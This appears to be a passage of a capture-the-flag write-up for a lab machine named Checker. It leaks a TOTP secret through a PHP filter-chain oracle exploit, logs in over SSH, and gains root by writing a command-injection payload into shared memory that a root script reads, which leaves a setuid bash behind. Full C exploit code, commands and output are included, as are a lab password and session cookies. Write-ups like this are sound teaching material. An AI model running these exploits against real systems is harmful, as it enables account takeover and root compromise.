+<p>We can login via SSH using the <code v-pre>reader</code> user and the password <code v-pre>hiccup-publicly-genesis</code>, but it asks for an OTP code. An <a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-multi-factor-authentication-for-ssh-on-ubuntu-16-04">article</a> on how to setup multi-factor authentication on SSH describes using <code v-pre>Google's PAM</code>. The section on <code v-pre>Recovering Access</code> it talks about a secret key in the user&#x27;s home folder at <code v-pre>/home/&lt;USER&gt;/.google_authenticator</code>. This secret key can be manually type it into an TOTP app to get the rotating codes.</p>
+<p>The problem is that we don&#x27;t have access to the home folder of <code v-pre>reader</code>. After being stuck for a while, the admin user also posted a page about <code v-pre>basic-backup-with-cp</code> where it makes a copy of the user&#x27;s home directory in <code v-pre>/backup/home_backup</code>.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/checker/bookstack-backups.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>I tried to see if there was a backup of this user&#x27;s home folder at <code v-pre>/backup/home_backup/home/reader</code> and here I was able to leak the <code v-pre>TOTP_AUTH</code> token.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-bash"><code v-pre class="language-bash">s3rp3nt@OMEN:~/php_filter_chains_oracle_exploit$ python3 filters_chain_oracle_exploit.py --target 'http://checker.htb/ajax/page/10/save-draft' --file '/backup/home_backup/home/reader/.google_authenticator' --verb PUT --parameter html --headers '{&quot;X-CSRF-TOKEN&quot;:&quot;L756lGhCCOxPAtJGbYnt2vWCqFP32qkPA1qZN9K7&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,&quot;Cookie&quot;:&quot;XSRF-TOKEN=eyJpdiI6Inc0YTlpRjRaVUlGanNLNWxuMTlYVlE9PSIsInZhbHVlIjoiMCt6T2E0enRlb0tzWExoQVQ2TmQrd2JJQkVqTkt0eXV5Mkcxbm5qQjFyR0l3bXMvZ3RLczBudThKSWNKSWxaUU0xM3ZXSHI1RXJQSlk4cVZLMHRLbXJBL0Fjc09zSmZ4UWlNTFlYTmIyR0dXRGZnMUd6N2RaYmgvMlBxaTF0RVIiLCJtYWMiOiJlZWVjYjA2MzljODk1YTI4OGYwNGRlMThlMWVjZDUyMmY4NDVhYjI0ZGRhMWM0YjQwMGY1YTIyZTA5YzJiMTNmIiwidGFnIjoiIn0%3D; bookstack_session=eyJpdiI6ImU3dng4c2lFbWRpTHVFQzZEbklVbWc9PSIsInZhbHVlIjoiUWNPWGtJZWs3Ym1oUWZvVDhrdnZVWXNoUGIvcy9md0xjcW1qd2JtRDlvUjlINUdwQ2ExcmdBTmJRcnIrT2dsdDhFMXNSZWNaUUMvZFpKaGtnbXBBZXY2eWQ0K1hnNGlUZCtSRXhOWnVYc2UydWV3eFFmS2FSSkY4RXFEeGtOWUciLCJtYWMiOiI3ZGU0MWMwYTg5NDZiZWI1YzYzNGQxMzk1ZTI3ZDc1ZGE4ZGIyMWY5MGZkYmRmOGYwMGM2NWE1NzFiMzhlNmRlIiwidGFnIjoiIn0%3D; teampass_session=j7355s4vo14islb0n6e34usucu; jstree_select=1; 558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2=071b2fcb9049e82b06036864832ea6a9364392df2c1fe3f364&quot;}'
+[*] The following URL is targeted : http://checker.htb/ajax/page/10/save-draft
+[*] The following local file is leaked : /backup/home_backup/home/reader/.google_authenticator
+[*] Running PUT requests
+[+] File /backup/home_backup/home/reader/.google_authenticator leak is finished!
+RFZEQlJBT0RMQ1dGN0kyT05BNEs1TFFMVUUKIiBUT1RQX0FVVEgK
+b'DVDBRAODLCWF7I2ONA4K5LQLUE\n&quot; TOTP_AUTH\n'</code></pre>
+</doc-codeblock></div>
+<p>We can use this key on <code v-pre>https://totp.danhersam.com</code> to generate the token.</p>
+<p><figure class="content-center">
+    <img src="../../../../assets/images/writeups/checker/totp-gen.png" alt="" />
+    <figcaption class="caption"></figcaption>
+</figure>
+</p>
+<p>We can now login to the machine and get the user flag.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">s3rp3nt@OMEN:~$ ssh reader@checker.htb
+(reader@checker.htb) Password: hiccup-publicly-genesis
+(reader@checker.htb) Verification code:836829
+reader@checker.htb:~$ cat user.txt</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="root">
+    <h2>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#root">#</doc-anchor-trigger>
+        <span>Root</span>
+    </h2>
+</doc-anchor-target>
+<p>We are able to run <code v-pre>/opt/hash-checker/check-leak.sh *</code> as the root user.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">reader@checker.htb:~$ sudo /opt/hash-checker/check-leak.sh test
+User not found in the database.</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="script-analysis">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#script-analysis">#</doc-anchor-trigger>
+        <span>Script analysis</span>
+    </h3>
+</doc-anchor-target>
+<p>We can try a few users and only <code v-pre>bob</code> makes the script run.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">reader@checker.htb:~$ sudo /opt/hash-checker/check-leak.sh test
+Password is leaked!
+Using the shared memory 0xE5BD2 as temp location
+User will be notified via bob@checker.htb</code></pre>
+</doc-codeblock></div>
+<p>When executing the script, we run <code v-pre>pspy</code> in another shell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">reader@checker.htb:~$ ./pspy64
+2025/02/23 00:42:14 CMD: UID=0     PID=1      | /sbin/init
+2025/02/23 00:42:16 CMD: UID=0     PID=42703  | sudo /opt/hash-checker/check-leak.sh bob
+2025/02/23 00:42:16 CMD: UID=0     PID=42706  |
+2025/02/23 00:42:16 CMD: UID=0     PID=42705  | /bin/bash /opt/hash-checker/check-leak.sh bob
+2025/02/23 00:42:16 CMD: UID=0     PID=42704  | sudo /opt/hash-checker/check-leak.sh bob
+2025/02/23 00:42:16 CMD: UID=0     PID=42708  | /bin/bash /opt/hash-checker/check-leak.sh bob
+2025/02/23 00:42:16 CMD: UID=0     PID=42707  | /bin/bash /opt/hash-checker/check-leak.sh bob
+2025/02/23 00:42:16 CMD: UID=0     PID=42709  |
+2025/02/23 00:42:16 CMD: UID=0     PID=42710  |
+2025/02/23 00:42:17 CMD: UID=0     PID=42712  | sh -c mysql -u teampass_user -D teampass -s -N -e 'select email from teampass_users where pw = &quot;$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy&quot;'
+2025/02/23 00:42:17 CMD: UID=0     PID=42713  | mysql -u teampass_user -D teampass -s -N -e select email from teampass_users where pw = &quot;$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy&quot;</code></pre>
+</doc-codeblock></div>
+<doc-anchor-target id="command-injection">
+    <h3>
+        <doc-anchor-trigger class="header-anchor-trigger" to="#command-injection">#</doc-anchor-trigger>
+        <span>Command Injection</span>
+    </h3>
+</doc-anchor-target>
+<p>The binary runs a shell command that is vulnerable to command injection if we are able to alter the <code v-pre>pw</code> value. We first need to see what the contents of the shared memory is. I asked ChatGPT how we can read from a shared memory location, and it gave me a small C script to start with.</p>
+<p><em><strong>Prompt:</strong> How can you read from a shared memory location on Linux based on the key?</em></p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/shm.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+#define SHM_KEY 1234  // The shared memory key
+#define SHM_SIZE 1024  // Size of the shared memory segment
+
+int main() {
+    // Step 1: Get shared memory segment ID
+    int shmid = shmget(SHM_KEY, SHM_SIZE, 0666);  // 0666 grants read and write permission
+
+    if (shmid == -1) {
+        perror(&quot;shmget failed&quot;);
+        return 1;
+    }
+
+    // Step 2: Attach the shared memory segment to our address space
+    void *shm_ptr = shmat(shmid, NULL, 0);  // Attach at any available location
+
+    if (shm_ptr == (void *)-1) {
+        perror(&quot;shmat failed&quot;);
+        return 1;
+    }
+
+    // Step 3: Read from the shared memory
+    printf(&quot;Reading from shared memory: %s\n&quot;, (char *)shm_ptr);
+
+    // Step 4: Detach the shared memory segment when done
+    if (shmdt(shm_ptr) == -1) {
+        perror(&quot;shmdt failed&quot;);
+        return 1;
+    }
+
+    return 0;
+}</code></pre>
+</doc-codeblock></div>
+<p>For this script to work, you would need to know the <code v-pre>SHM_KEY</code> value, but this is not a fixed location. We will do the following modifications:</p>
+<ol>
+<li>Randomly generate key values and run the script in a loop</li>
+<li>When the shared memory location is not empty, print the contents and break out of the loop</li>
+</ol>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/shm.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;time.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define SHM_SIZE 1024  // Size of the shared memory segment
+
+int main() {
+    printf(&quot;Brute forcing shared memory addresses...\n&quot;);
+    while (1) {
+        // Step 0: generate random key
+        time_t current_time = time(NULL);
+        srand((unsigned int)current_time);
+        int random = rand();
+        key_t SHM_KEY = random % 0xfffff;
+
+        // Step 1: Get shared memory segment ID
+        // IPC_CREAT will create the segment if it does not exist.
+        int shmid = shmget(SHM_KEY, SHM_SIZE, IPC_CREAT | 0666);  // 0666 grants read and write permission
+
+        if (shmid == -1) {
+            perror(&quot;shmget failed&quot;);
+            return 1;
+        }
+
+        // Step 2: Attach the shared memory segment to our address space
+        char *shm_addr = (char *)shmat(shmid, NULL, 0);  // Attach at any available location
+
+        if (shm_addr == (char *)-1) {
+            perror(&quot;shmat failed&quot;);
+            return 1;
+        }
+
+        // Check if memory segment is not empty
+        if (shm_addr[0] != '\0') {
+            // Step 3: Read from the shared memory
+            printf(&quot;[+] Got a hit at key: 0x%lx\n&quot;, (unsigned long)SHM_KEY);
+            printf(&quot;[+] Reading content: %s\n&quot;, shm_addr);
+
+            // Step 4: Detach the shared memory segment when done
+            if (shmdt(shm_addr) == -1) {
+                perror(&quot;shmdt failed&quot;);
+                return 1;
+            }
+            break;
+        }
+    }
+    return 0;
+}</code></pre>
+</doc-codeblock></div>
+<p>We compile and run the script and then run the <code v-pre>check-leak.sh</code> command as root in another shell.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">reader@checker.htb:~$ gcc -o leak leak.c
+reader@checker.htb:~$ ./leak 
+Brute forcing shared memory addresses...
+[+] Got a hit at key: 0x8117c
+[+] Reading content: Leaked hash detected at Sun Feb 23 15:36:21 2025 &gt; $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
+
+reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
+Password is leaked!
+Using the shared memory 0x8117C as temp location
+User will be notified via bob@checker.htb</code></pre>
+</doc-codeblock></div>
+<p>The leaked memory contains the password of bob, as we expected. So in order to exploit this we need to overwrite the shared memory location (replace the password hash with injection payload). We can see that the password hash is captured after the <code v-pre>&gt;</code> sign, so this is the place where we can place our command injection payload. Our final exploit will copy <code v-pre>/bin/bash</code> to <code v-pre>/tmp</code> and add the <code v-pre>setuid</code> bit to it.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-c"><code v-pre class="language-c">#include &lt;stdio.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/shm.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;time.h&gt;
+#include &lt;stdlib.h&gt;
+
+#define SHM_SIZE 1024  // Size of the shared memory segment
+
+int main() {
+    printf(&quot;Brute forcing shared memory addresses...\n&quot;);
+    while (1) {
+        // Step 0: generate random key
+        time_t current_time = time(NULL);
+        srand((unsigned int)current_time);
+        int random = rand();
+        key_t SHM_KEY = random % 0xfffff;
+
+        // Step 1: Get shared memory segment ID
+        // IPC_CREAT will create the segment if it does not exist.
+        int shmid = shmget(SHM_KEY, SHM_SIZE, IPC_CREAT | 0666);  // 0666 grants read and write permission
+
+        if (shmid == -1) {
+            perror(&quot;shmget failed&quot;);
+            return 1;
+        }
+
+        // Step 2: Attach the shared memory segment to our address space
+        char *shm_addr = (char *)shmat(shmid, NULL, 0);  // Attach at any available location
+
+        if (shm_addr == (char *)-1) {
+            perror(&quot;shmat failed&quot;);
+            return 1;
+        }
+
+        // Check if memory segment is not empty
+        if (shm_addr[0] != '\0') {
+            // Step 3: Read from the shared memory
+            printf(&quot;[+] Got a hit at key: 0x%lx\n&quot;, (unsigned long)SHM_KEY);
+            printf(&quot;[+] Reading content: %s\n&quot;, shm_addr);
+
+            // Step 4: Write the payload to the shared memory segment.
+            const char *payload = &quot;Leaked hash detected at Sun Feb 23 xx:xx:xx 2025 &gt; ';cp /bin/bash /tmp/bash; chmod u+s /tmp/bash ;#&quot;;
+            snprintf(shm_addr, SHM_SIZE, &quot;%s&quot;, payload);
+
+            printf(&quot;[+] Payload injected into shared memory! Detaching memory...\n&quot;);
+
+            // Step 5: Detach the shared memory segment when done
+            if (shmdt(shm_addr) == -1) {
+                perror(&quot;shmdt failed&quot;);
+                return 1;
+            }
+            break;
+        }
+    }
+    return 0;
+}</code></pre>
+</doc-codeblock></div>
+<p>Lets compile and run it again.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">reader@checker:~$ gcc -o leak leak.c
+reader@checker:~$ ./leak
+Brute forcing shared memory addresses...
+
+reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
+Password is leaked!
+Using the shared memory 0x33C30 as temp location
+ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '&quot;' at line 1
+Failed to read result from the db
+
+reader@checker:/tmp$ ls -la | grep bash
+-rwsr-xr-x  1 root root 1396520 Feb 23 15:53 bash</code></pre>
+</doc-codeblock></div>
+<p>The exploit worked and now we can get the root flag.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre class="language-shell-session"><code v-pre class="language-shell-session">reader@checker:/tmp$ /tmp/bash -p
+bash-5.1# cat /root/root.txt</code></pre>
+</doc-codeblock></div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer class="clear-both">
+                            
+                            </footer>
+                        </main>
+                
+                        <div class="print:border-none border-t dark:border-dark-650 pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div class="print:hidden">
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                    </ul>
+                                </div>
+                                <div class="print:justify-center docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="docs-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Checker (Hard)", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
